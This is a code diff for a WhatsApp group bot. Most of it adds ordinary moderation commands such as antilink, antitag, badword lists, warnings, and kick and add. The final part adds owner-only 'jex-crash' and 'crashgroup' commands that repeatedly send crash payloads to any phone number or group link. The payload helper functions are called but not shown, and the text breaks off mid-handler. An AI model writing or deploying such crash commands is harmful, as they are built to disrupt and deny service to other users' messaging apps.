+            await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
+            return reply(`✅ *Successfully enabled antilink ${mode} mode*`);
+        }
+        
+        // If user wants to turn this specific mode OFF
+        if (action === 'off') {
+            // Check what the current mode is
+            const currentMode = await db.getGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
+            
+            // If the current mode matches what they're trying to turn off
+            if (currentMode === mode) {
+                // Disable antilink completely
+                await db.setGroupSetting(botNumber, m.chat, 'antilink', false);
+                return reply(`✅ *Antilink has been disabled*`);
+            } else {
+                // They're trying to turn off a mode that's not active
+                return reply(`⚠️ *Antilink is currently in ${currentMode} mode, not ${mode} mode*\n\nUse .antilink off to disable completely.`);
+            }
+        }
+        
+        // If no action specified (just ".antilink delete" without on/off)
+        if (!action) {
+            await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', mode);
+            await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
+            return reply(`✅ *Successfully enabled antilink ${mode} mode*`);
+        }
+    }
+    
+    reply(`Invalid option! Use: on, off, delete, warn, kick, or [mode] on/off`);
+    break;
+}
+case 'allowlink': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.admin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const action = args[0]?.toLowerCase();
+    
+    // Get target user from:
+    // 1. Mentioned user
+    // 2. Quoted message sender
+    // 3. Argument (phone number)
+    let target = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : args[1]);
+    
+    if (!action) {
+        const allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
+        return reply(`*📋 ALLOWLINK COMMANDS*\n\n• ${prefix}allowlink add @user (or reply to their message)\n• ${prefix}allowlink remove @user (or reply to their message)\n• ${prefix}allowlink list\n• ${prefix}allowlink clear\n\nTotal allowed: ${allowed.length}`);
+    }
+    
+    // ADD USER
+    if (action === 'add') {
+        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink add @user');
+        
+        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
+        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
+        
+        if (allowed.includes(jid)) {
+            return reply(`❌ @${jid.split('@')[0]} is already in allowlist`, { mentions: [jid] });
+        }
+        
+        allowed.push(jid);
+        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
+        
+        // Get username for better response
+        const name = await conn.getName(jid) || jid.split('@')[0];
+        return reply(`✅ @${name} can now post links`, { mentions: [jid] });
+    }
+    
+    // REMOVE USER
+    if (action === 'remove') {
+        if (!target) return reply('❌ Please mention the user, reply to their message, or provide their number!\nExample: .allowlink remove @user');
+        
+        const jid = target.includes('@s.whatsapp.net') ? target : target + '@s.whatsapp.net';
+        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
+        
+        const index = allowed.indexOf(jid);
+        if (index === -1) {
+            return reply(`❌ @${jid.split('@')[0]} is not in allowlist`, { mentions: [jid] });
+        }
+        
+        allowed.splice(index, 1);
+        await db.setGroupSetting(botNumber, m.chat, 'allowlink', allowed);
+        
+        const name = await conn.getName(jid) || jid.split('@')[0];
+        return reply(`✅ @${name} removed from allowlist`, { mentions: [jid] });
+    }
+    
+    // LIST ALLOWED USERS
+    if (action === 'list') {
+        let allowed = await db.getGroupSetting(botNumber, m.chat, 'allowlink', []);
+        
+        if (allowed.length === 0) {
+            return reply('📋 No users are allowed to post links');
+        }
+        
+        let msg = `*📋 ALLOWED USERS (${allowed.length})*\n\n`;
+        allowed.forEach((jid, i) => {
+            msg += `${i + 1}. @${jid.split('@')[0]}\n`;
+        });
+        
+        return conn.sendMessage(m.chat, { 
+            text: msg, 
+            mentions: allowed 
+        }, { quoted: m });
+    }
+    
+    // CLEAR ALL ALLOWED USERS
+    if (action === 'clear') {
+        await db.setGroupSetting(botNumber, m.chat, 'allowlink', []);
+        return reply('✅ All users removed from allowlist');
+    }
+    
+    reply(`❌ Invalid action! Use: add, remove, list, clear`);
+    break;
+}
+case "antidemote":
+case "antidm": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    const mode = args[0]?.toLowerCase();
+    
+    if (!mode) {
+        const enabled = await db.getGroupSetting(botNumber, m.chat, 'antidemote', false);
+        const action = await db.getGroupSetting(botNumber, m.chat, 'antidemoteaction', 'revert');
+        
+        const actionLabels = {
+            'revert': '🔄 Revert — restore demoted admin',
+            'kick': '🚫 Kick — remove both parties',
+            'demote': '⬇️ Demote — demote the demoter'
+        };
+        
+        return reply(`🛡️ *ANTIDEMOTE SETTINGS*\n\n` +
+                     `Status: *${enabled ? '✅ ON' : '❌ OFF'}*\n` +
+                     `Action: *${enabled ? (actionLabels[action] || action) : '—'}*\n\n` +
+                     `*Commands:*\n` +
+                     `• ${prefix}antidemote on — Enable\n` +
+                     `• ${prefix}antidemote off — Disable\n` +
+                     `• ${prefix}antidemote revert — Restore demoted admin\n` +
+                     `• ${prefix}antidemote kick — Kick both parties\n` +
+                     `• ${prefix}antidemote demote — Demote the demoter`);
+    }
+    
+    if (mode === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antidemote', true);
+        const action = await db.getGroupSetting(botNumber, m.chat, 'antidemoteaction', 'revert');
+        const actionLabels = { 'revert': 'revert', 'kick': 'kick', 'demote': 'demote' };
+        return reply(`✅ *AntiDemote enabled* — Action: *${actionLabels[action] || action}*`);
+    }
+    
+    if (mode === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antidemote', false);
+        return reply(`✅ *AntiDemote disabled*`);
+    }
+    
+    if (['revert', 'kick', 'demote'].includes(mode)) {
+        await db.setGroupSetting(botNumber, m.chat, 'antidemoteaction', mode);
+        await db.setGroupSetting(botNumber, m.chat, 'antidemote', true);
+        
+        const labels = {
+            'revert': '🔄 Revert — restore demoted admin',
+            'kick': '🚫 Kick — remove both parties',
+            'demote': '⬇️ Demote — demote the demoter'
+        };
+        return reply(`✅ *AntiDemote action set to:* ${labels[mode]}`);
+    }
+    
+    reply(`❌ Invalid option! Use: on, off, revert, kick, demote`);
+    break;
+}
+case "antipromote":
+case "antipm": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    const mode = args[0]?.toLowerCase();
+    
+    if (!mode) {
+        const enabled = await db.getGroupSetting(botNumber, m.chat, 'antipromote', false);
+        const action = await db.getGroupSetting(botNumber, m.chat, 'antipromoteaction', 'revert');
+        
+        const actionLabels = {
+            'revert': '🔄 Revert — demote promoted member',
+            'kick': '🚫 Kick — remove both parties',
+            'demote': '⬇️ Demote — demote both parties'
+        };
+        
+        return reply(`🛡️ *ANTIPROMOTE SETTINGS*\n\n` +
+                     `Status: *${enabled ? '✅ ON' : '❌ OFF'}*\n` +
+                     `Action: *${enabled ? (actionLabels[action] || action) : '—'}*\n\n` +
+                     `*Commands:*\n` +
+                     `• ${prefix}antipromote on — Enable\n` +
+                     `• ${prefix}antipromote off — Disable\n` +
+                     `• ${prefix}antipromote revert — Demote promoted member\n` +
+                     `• ${prefix}antipromote kick — Kick both parties\n` +
+                     `• ${prefix}antipromote demote — Demote both parties`);
+    }
+    
+    if (mode === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antipromote', true);
+        const action = await db.getGroupSetting(botNumber, m.chat, 'antipromoteaction', 'revert');
+        const actionLabels = { 'revert': 'revert', 'kick': 'kick', 'demote': 'demote' };
+        return reply(`✅ *AntiPromote enabled* — Action: *${actionLabels[action] || action}*`);
+    }
+    
+    if (mode === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antipromote', false);
+        return reply(`✅ *AntiPromote disabled*`);
+    }
+    
+    if (['revert', 'kick', 'demote'].includes(mode)) {
+        await db.setGroupSetting(botNumber, m.chat, 'antipromoteaction', mode);
+        await db.setGroupSetting(botNumber, m.chat, 'antipromote', true);
+        
+        const labels = {
+            'revert': '🔄 Revert — demote promoted member back',
+            'kick': '🚫 Kick — remove both parties from group',
+            'demote': '⬇️ Demote — demote both promoter and promoted'
+        };
+        return reply(`✅ *AntiPromote action set to:* ${labels[mode]}`);
+    }
+    
+    reply(`❌ Invalid option! Use: on, off, revert, kick, demote`);
+    break;
+}
+case 'antitag': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.admin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const mode = args[0]?.toLowerCase();
+    const action = args[1]?.toLowerCase();
+    
+    // Delete mode
+    if (mode === 'delete' && action === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'delete');
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
+        return reply('✅ *Successfully enabled antitag delete mode*');
+    }
+    if (mode === 'delete' && action === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
+        return reply('*Successfully disenabled antitag delete mode*');
+    }
+    
+    // Warn mode
+    if (mode === 'warn' && action === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'warn');
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
+        return reply('✅ *Successfully enabled antitag warn mode*');
+    }
+    if (mode === 'warn' && action === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
+        return reply('*Successfully disenabled antitag warn mode*');
+    }
+    
+    // Kick mode
+    if (mode === 'kick' && action === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagmode', 'kick');
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', true);
+        return reply('✅ *Successfully enabled antitag kick mode*');
+    }
+    if (mode === 'kick' && action === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitag', false);
+        return reply('*Successfully disenabled antitag kick mode*');
+    }
+    
+    // Show help if invalid
+    reply('❌ Use: delete on/off, warn on/off, kick on/off');
+    break;
+}
+case 'antitagadmin':
+case 'antitagadm': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.admin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const mode = args[0]?.toLowerCase();
+    
+    if (!mode) {
+        const status = await db.getGroupSetting(botNumber, m.chat, 'antitagadmin', false);
+        const currentAction = await db.getGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
+        return reply(`*👑 ANTITAG ADMIN SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nAction: ${currentAction}\n\nOptions:\n• ${prefix}antitagadmin on\n• ${prefix}antitagadmin off\n• ${prefix}antitagadmin delete\n• ${prefix}antitagadmin warn\n• ${prefix}antitagadmin kick`);
+    }
+    
+    // Handle on/off
+    if (mode === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true);
+        return reply('✅ Anti-tag admin has been enabled');
+    }
+    
+    if (mode === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', false);
+        return reply('✅ Anti-tag admin has been disabled');
+    }
+    
+    // Handle action settings
+    if (mode === 'delete') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'delete');
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
+        return reply('✅ *Successfully enabled antitagadmin delete mode*');
+    }
+    
+    if (mode === 'warn') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'warn');
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
+        return reply('✅ *Successfully enabled antitagadmin warn mode*');
+    }
+    
+    if (mode === 'kick') {
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadminaction', 'kick');
+        await db.setGroupSetting(botNumber, m.chat, 'antitagadmin', true); // Auto-enable
+        return reply('✅ *Successfully enabled antitagadmin kick mode*');
+    }
+    
+    reply(`❌ Invalid option! Use: on, off, delete, warn, kick`);
+    break;
+}
+case "antibadword": {
+if (!isGroup) return reply(global.mess.notgroup);
+            if (!m.isAdmin) return reply(global.mess.notadmin);
+            if (!m.isBotAdmin) return reply(global.mess.botadmin);
+
+        const chatId = m.chat;
+        const mode = args[0]?.toLowerCase();
+        const action = args[1]?.toLowerCase();
+
+        // Show help if no arguments
+        if (!mode) {
+            const status = await db.getGroupSetting(botNumber, chatId, 'antibadword', false);
+            const currentAction = await db.getGroupSetting(botNumber, chatId, 'badwordaction', 'delete');
+            const badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
+            
+            let helpText = `╭──❖ 「 ANTIBADWORD 」 ❖──
+│
+│  *Status* : ${status ? '✅ ON' : '❌ OFF'}
+│  *Action* : ${currentAction}
+│  *Words*  : ${badwords.length}
+│
+│  *Commands:*
+│  • ${prefix}antibadword delete on
+│  • ${prefix}antibadword delete off
+│  • ${prefix}antibadword warn on
+│  • ${prefix}antibadword warn off
+│  • ${prefix}antibadword kick on
+│  • ${prefix}antibadword kick off
+│  • ${prefix}antibadword add <word>
+│  • ${prefix}antibadword remove <word>
+│  • ${prefix}antibadword list
+│  • ${prefix}antibadword clear
+│
+│  *Examples:*
+│  • ${prefix}antibadword delete on
+│  • ${prefix}antibadword add fuck
+│
+╰─────────❖`;
+
+            return reply(helpText);
+        }
+
+        // Handle add word
+        if (mode === 'add') {
+            const word = action;
+            if (!word) return reply('❌ Please provide a word to add.\nExample: .antibadword add fuck');
+            
+            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
+            if (badwords.includes(word.toLowerCase())) {
+                return reply(`The word "${word}" is already in the list.`);
+            }
+            
+            badwords.push(word.toLowerCase());
+            await db.setGroupSetting(botNumber, chatId, 'badwords', badwords);
+            
+            return reply(`✅ Added *${word}* to badword list.\nTotal badwords: ${badwords.length}`);
+        }
+
+        // Handle remove word
+        if (mode === 'remove') {
+            const word = action;
+            if (!word) return reply('Please provide a word to remove.\nExample: .antibadword remove fuck');
+            
+            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
+            const index = badwords.indexOf(word.toLowerCase());
+            
+            if (index === -1) {
+                return reply(`The word "${word}" is not in the list.`);
+            }
+            
+            badwords.splice(index, 1);
+            await db.setGroupSetting(botNumber, chatId, 'badwords', badwords);
+            
+            return reply(`✅ Removed *${word}* from badword list.\nTotal badwords: ${badwords.length}`);
+        }
+
+        // Handle list
+        if (mode === 'list') {
+            let badwords = await db.getGroupSetting(botNumber, chatId, 'badwords', []);
+            
+            if (badwords.length === 0) {
+                return reply('📋 No badwords added yet. Use `.antibadword add <word>` to add some.');
+            }
+            
+            let listText = `╭──❖ 「 BADWORD LIST 」 ❖──\n│\n`;
+            badwords.forEach((word, i) => {
+                listText += `│  ${i + 1}. ${word}\n`;
+            });
+            listText += `│\n╰─────────❖`;
+            
+            return reply(listText);
+        }
+
+        // Handle clear
+        if (mode === 'clear') {
+            await db.setGroupSetting(botNumber, chatId, 'badwords', []);
+            return reply('✅ All badwords have been cleared from the list.');
+        }
+
+        // Handle action modes (delete, warn, kick)
+        if (['delete', 'warn', 'kick'].includes(mode)) {
+            if (!action || !['on', 'off'].includes(action)) {
+                return reply(`❌ Please specify on or off.\nExample: .antibadword ${mode} on`);
+            }
+
+            const enabled = action === 'on';
+            
+            // Set the action type
+            await db.setGroupSetting(botNumber, chatId, 'badwordaction', mode);
+            // Enable/disable the feature
+            await db.setGroupSetting(botNumber, chatId, 'antibadword', enabled);
+            
+            return reply(`✅ Antibadword *${mode}* has been *${action}* for this group.`);
+        }
+
+        // Invalid command
+        reply('❌ Invalid command! Use `.antibadword` to see available commands.');
+}
+break
+case "antisticker": {
+            if (!isGroup) return reply(global.mess.notgroup);
+            if (!m.isAdmin) return reply(global.mess.notadmin);
+            if (!m.isBotAdmin) return reply(global.mess.botadmin);
+            
+
+        const chatId = m.chat;
+        const mode = args[0]?.toLowerCase();
+        const action = args[1]?.toLowerCase();
+
+        // Show help if no arguments
+        if (!mode) {
+            const status = await db.getGroupSetting(botNumber, chatId, 'antisticker', false);
+            const currentAction = await db.getGroupSetting(botNumber, chatId, 'antistickeraction', 'delete');
+            
+            let helpText = `╭──❖ 「 ANTISTICKER 」 ❖──
+│
+│  *Status* : ${status ? '✅ ON' : '❌ OFF'}
+│  *Action* : ${currentAction}
+│
+│  *Commands:*
+│  • ${prefix}antisticker delete on
+│  • ${prefix}antisticker delete off
+│  • ${prefix}antisticker warn on
+│  • ${prefix}antisticker warn off
+│  • ${prefix}antisticker kick on
+│  • ${prefix}antisticker kick off
+│
+│  *Examples:*
+│  • ${prefix}antisticker delete on
+│  • ${prefix}antisticker warn on
+│
+╰─────────❖`;
+
+            return reply(helpText);
+        }
+
+        // Handle action modes (delete, warn, kick)
+        if (['delete', 'warn', 'kick'].includes(mode)) {
+            if (!action || !['on', 'off'].includes(action)) {
+                return reply(`Please specify on or off.\nExample: .antisticker ${mode} on`);
+            }
+
+            const enabled = action === 'on';
+            
+            // Set the action type
+            await db.setGroupSetting(botNumber, chatId, 'antistickeraction', mode);
+            // Enable/disable the feature
+            await db.setGroupSetting(botNumber, chatId, 'antisticker', enabled);
+            
+            return reply(`✅ Antisticker *${mode}* has been *${action}* for this group.`);
+        }
+
+        // Invalid command
+        reply('❌ Invalid command! Use `.antisticker` to see available commands.');
+}
+break
+case "setgrouppp":
+case "setppgroup": {
+ if (!m.isGroup) return reply(mess.group);
+
+    if (!quoted) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
+    if (!/image/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
+    if (/webp/.test(mime)) return reply(`*Send or reply to an image with the caption ${prefix + command}*`);
+
+    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");
+    if (args[0] === "full") {
+      const { img } = await generateProfilePicture(medis);
+      await conn.query({
+        tag: "iq",
+        attrs: {
+          to: m.chat,
+          type: "set",
+          xmlns: "w:profile:picture",
+        },
+        content: [
+          {
+            tag: "picture",
+            attrs: {
+              type: "image",
+            },
+            content: img,
+          },
+        ],
+      });
+      fs.unlinkSync(medis);
+      reply("Group profile picture has been successfully set.");
+    } else {
+      await conn.updateProfilePicture(m.chat, { url: medis });
+      fs.unlinkSync(medis);
+      reply("Group profile picture has been successfully updated.");
+    }
+}
+break
+case "setgroupname": {
+       if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        if (!text) return reply("*Desired groupname?*");
+
+        await conn.groupUpdateSubject(m.chat, text);
+        reply(mess.done);
+}
+break
+case "tagadmin": {
+    if (!m.isGroup) return reply(mess.group);
+    const groupAdmins = participants.filter((p) => p.admin);
+    const listAdmin = groupAdmins
+      .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
+      .join("\n");
+    const owner = groupMetadata.owner || groupAdmins.find((p) => p.admin === "superadmin")?.id || m.chat.split`-`[0] + "@s.whatsapp.net";
+    let text = `*Group Admins Here:*\n${listAdmin}`.trim();
+
+    conn.sendMessage(
+      m.chat,
+      { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
+      { quoted: m }
+    );
+}
+break
+case "tagall2": {
+try {
+        
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+
+        let message = "📢 *Attention Everyone!* \n\n";
+        const mentions = participants.map(p => p.id);
+        
+        mentions.forEach(userId => {
+            message += `@${userId.split('@')[0]} `;
+        });
+
+        await conn.sendMessage(from, {
+            text: message,
+            mentions,
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        }, { quoted: mek });
+
+    } catch (error) {
+        console.error("TagAll Error:", error);
+        reply("❌ Failed to tag all members");
+    }
+}
+break
+case "link":
+case "linkgc": {
+    if (!Access) return reply(mess.owner);
+        if (!m.isGroup) return reply(mess.group);
+    
+    try {
+        // Get fresh group metadata to ensure we have latest data
+        const freshGroupMetadata = await conn.groupMetadata(m.chat);
+        let groupInvite = await conn.groupInviteCode(m.chat);
+        let groupOwner = freshGroupMetadata.owner ? `+${freshGroupMetadata.owner.split('@')[0]}` : "Unknown";
+        let groupLink = `https://chat.whatsapp.com/${groupInvite}`;
+        let memberCount = freshGroupMetadata.participants.length;
+
+        let message = `🔗 *GROUP LINK*\n\n` +
+                      `📌 *Name:* ${freshGroupMetadata.subject}\n` +
+                      `👑 *Owner:* ${groupOwner}\n` +
+                      `🆔 *Group ID:* ${freshGroupMetadata.id}\n` +
+                      `👥 *Members:* ${memberCount}\n\n` +
+                      `🌍 *Link:* ${groupLink}\n\n> ${global.wm}`;
+
+        await conn.sendMessage(m.chat, { text: message }, { detectLink: true });
+    } catch (error) {
+        console.error('Error generating group link:', error);
+        reply("❌ *Failed to fetch group link. Make sure the bot has admin permissions.*");
+    }
+}
+break
+case "unmute":
+case "open": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        conn.groupSettingUpdate(m.chat, "not_announcement");
+        reply("Group opened by admin. Members can now send messages.");
+}
+break
+case "add": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+         if (!text) return reply(`*Please provide phone number with no country code.*\nExample: ${prefix + command} 256755585369`);
+
+
+        
+        let bws = m.quoted
+            ? m.quoted.sender
+            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+        await conn.groupParticipantsUpdate(m.chat, [bws], "add");
+        reply(mess.done);
+}
+break
+case "kick": {       
+        if (!m.isGroup) return reply(mess.group);
+       if (!m.isAdmin) return reply(mess.notadmin);
+       if (!m.isBotAdmin) return reply(mess.botadmin);
+        let bck = m.mentionedJid[0]
+            ? m.mentionedJid[0]
+            : m.quoted
+            ? m.quoted.sender
+            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+        await conn.groupParticipantsUpdate(m.chat, [bck], "remove");
+        reply(mess.done);
+}
+break
+case "warn": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin && !Access) return reply(mess.admin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+
+        const WARN_LIMIT = 3;
+        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
+        if (!target) return reply(mess.make.usage(prefix + command, '@user [reason]'));
+
+        let reason = args.slice(m.mentionedJid[0] ? 1 : 0).join(' ').trim() || 'No reason given';
+
+        try {
+            let warnings = await db.getGroupSetting(botNumber, m.chat, 'warnings', {});
+            let entry = warnings[target] || { count: 0, reasons: [] };
+            entry.count += 1;
+            entry.reasons.push({ reason, by: m.sender, at: Date.now() });
+            warnings[target] = entry;
+
+            if (entry.count >= WARN_LIMIT) {
+                delete warnings[target];
+                await db.setGroupSetting(botNumber, m.chat, 'warnings', warnings);
+                await conn.groupParticipantsUpdate(m.chat, [target], "remove");
+                await conn.sendMessage(m.chat, {
+                    text: `🚫 *@${target.split('@')[0]} reached ${WARN_LIMIT}/${WARN_LIMIT} warnings and has been removed.*\n\n📝 *Last reason:* ${reason}`,
+                    mentions: [target]
+                }, { quoted: m });
+            } else {
+                await db.setGroupSetting(botNumber, m.chat, 'warnings', warnings);
+                await conn.sendMessage(m.chat, {
+                    text: `⚠️ *Warning issued*\n\n👤 *User:* @${target.split('@')[0]}\n📝 *Reason:* ${reason}\n🔢 *Warnings:* ${entry.count}/${WARN_LIMIT}\n\n_Reaches ${WARN_LIMIT} and they're auto-removed._`,
+                    mentions: [target]
+                }, { quoted: m });
+            }
+        } catch (error) {
+            console.error('Warn command error:', error);
+            reply(mess.error);
+        }
+}
+break
+case "warnings":
+case "listwarn": {
+        if (!m.isGroup) return reply(mess.group);
+
+        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
+
+        try {
+            let warnings = await db.getGroupSetting(botNumber, m.chat, 'warnings', {});
+
+            if (target) {
+                let entry = warnings[target];
+                if (!entry || !entry.count) {
+                    return await conn.sendMessage(m.chat, {
+                        text: `✅ @${target.split('@')[0]} has no warnings.`,
+                        mentions: [target]
+                    }, { quoted: m });
+                }
+                let list = entry.reasons.map((r, i) => `${i + 1}. ${r.reason}`).join('\n');
+                await conn.sendMessage(m.chat, {
+                    text: `⚠️ *Warnings for* @${target.split('@')[0]}\n\n🔢 *Total:* ${entry.count}/3\n\n${list}`,
+                    mentions: [target]
+                }, { quoted: m });
+            } else {
+                let entries = Object.entries(warnings).filter(([, v]) => v && v.count > 0);
+                if (!entries.length) return reply('✅ No one in this group has any warnings.');
+                let list = entries.map(([jid, v], i) => `${i + 1}. @${jid.split('@')[0]} — ${v.count}/3`).join('\n');
+                await conn.sendMessage(m.chat, {
+                    text: `⚠️ *Group Warnings*\n\n${list}`,
+                    mentions: entries.map(([jid]) => jid)
+                }, { quoted: m });
+            }
+        } catch (error) {
+            console.error('Warnings command error:', error);
+            reply(mess.error);
+        }
+}
+break
+case "resetwarn":
+case "unwarn": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin && !Access) return reply(mess.admin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+
+        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
+        if (!target) return reply(mess.make.usage(prefix + command, '@user'));
+
+        try {
+            let warnings = await db.getGroupSetting(botNumber, m.chat, 'warnings', {});
+            delete warnings[target];
+            await db.setGroupSetting(botNumber, m.chat, 'warnings', warnings);
+            await conn.sendMessage(m.chat, {
+                text: global.mess.make.success(`Warnings cleared for @${target.split('@')[0]}.`),
+                mentions: [target]
+            }, { quoted: m });
+        } catch (error) {
+            console.error('Resetwarn command error:', error);
+            reply(mess.error);
+        }
+}
+break
+case "getgrouppp":
+case "grouppp":
+case "groupicon":
+case "groupavatar": {
+     if (!m.isGroup) return reply(mess.group);
+
+    try {
+      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');
+
+      await conn.sendMessage(m.chat, 
+        { 
+          image: { url: ppUrl }, 
+          caption: `🔥 *This Group's Profile Picture*`
+        }, 
+        { quoted: m }
+      );
+    } catch {
+      await conn.sendMessage(m.chat, 
+        { 
+          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
+          caption: '⚠️ No profile picture found for this group.'
+        }, 
+        { quoted: m }
+      );
+    }
+}
+break
+case "groupinfo": {
+try {
+        if (!isGroup) return reply("❌ This command can only be used in groups");
+
+        const metadata = await conn.groupMetadata(from);
+        let ppUrl;
+        try {
+            ppUrl = await conn.profilePictureUrl(from, "image");
+        } catch {
+            ppUrl = "https://i.imgur.com/8nLFCVP.png"; // Default group icon
+        }
+
+        const infoText = `
+*${metadata.subject}*
+
+👥 *Participants:* ${metadata.size}
+👑 *Owner:* @${metadata.owner.split('@')[0]}
+📝 *Description:* ${metadata.desc || "None"}
+🆔 *Group ID:* ${metadata.id}
+`.trim();
+
+        await conn.sendMessage(from, {
+            image: { url: ppUrl },
+            caption: infoText,
+            mentions: [metadata.owner],
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        }, { quoted: mek });
+
+    } catch (error) {
+        console.error("GInfo Error:", error);
+        reply("❌ Failed to get group information");
+    }
+}
+break
+case "resetlinkgc": {
+if (!m.isGroup) return reply(mess.group)
+if (!m.isAdmin) return reply(mess.notadmin);
+if (!m.isBotAdmin) return reply(mess.botadmin);
+
+conn.groupRevokeInvite(from)
+reply("*group link reseted by admin*" )
+}
+break
+case "userjid":
+case "userid": {
+if (!m.isGroup) return reply(mess.group);
+if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+        const groupMetadata = m.isGroup
+            ? await conn.groupMetadata(m.chat).catch((e) => {})
+            : "";
+        const participants = m.isGroup
+            ? await groupMetadata.participants
+            : "";
+        let textt = `Here is jid address of all users of\n *${groupMetadata.subject}*\n\n`;
+        for (let mem of participants) {
+            textt += `□ ${mem.id}\n`;
+        }
+        reply(textt);
+}
+break
+//======================
+case 'jex-crash': {    
+    if (!Access) return reply(mess.owner);
+    
+    if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
+    let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    reply(`*[!] Successfully sent bugs to target...*`); 
+    
+    // Send multiple crash cycles
+    for (let i = 0; i < 3; i++) {
+        await generateMassivePayload(conn, target);
+        await sendSystemCrashMessage(conn, target);
+        await sendListMessage(conn, target);
+        await sendLiveLocationMessage(conn, target);
+        await sendViewOnceMessages(conn, target);
+        await sendPaymentInvite(conn, target);
+        await sendExtendedTextMessage(conn, target);
+    }
+    
+    break;
+}
+case 'crashgroup':
+case 'crash-gc': {    
+    if (!Access) return reply(mess.owner);
+    
+    if (!text) return reply(`*Example:* ${prefix + command} https://chat.whatsapp.com/xxxxx`);
+    
+    // If it's a WhatsApp invite link, get the group JID
+    if (text.includes('chat.whatsapp.com')) {
+        const inviteCode = text.split('chat.whatsapp.com/')[1].split('?')[0];
+        try {
+            const groupData = await conn.groupGetInviteInfo(inviteCode);
+            groupJid = groupData.id;
+        } catch (e) {
+            return reply(`Failed to get group info. Make sure the bot is in the group or the link is valid.`);
+        }
+    }
+    
+    reply(`*[!] Sending ultimate group crash to target group...*\n\nGroup: ${groupJid}`);
+    
+    // Get participants if bot is in the group
+    let participants = [];
+    try {
+        const metadata = await conn.groupMetadata(groupJid);
+        participants = metadata.participants.map(p => p.id);
+    } catch (e) {}
